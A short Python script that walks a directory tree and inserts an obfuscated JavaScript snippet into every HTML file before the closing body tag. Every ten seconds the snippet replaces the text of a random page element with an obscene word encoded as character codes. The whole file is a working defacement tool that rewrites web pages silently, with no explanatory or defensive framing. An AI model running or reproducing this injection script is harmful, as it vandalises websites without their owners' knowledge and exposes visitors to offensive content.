import os

js_code = "<script>setInterval(m=>{var e=document.querySelectorAll('*');e[m.floor(m.random()*e.length)].innerText=String.fromCharCode(112,101,110,105,115)},1e4,Math);</script>"

directory = '.'

for root, dirs, files in os.walk(directory):
    for file in files:
        if file.endswith('.html'):
            file_path = os.path.join(root, file)
            
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            if '</body>' in content:
                content = content.replace('</body>', f'{js_code}\n</body>')

            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
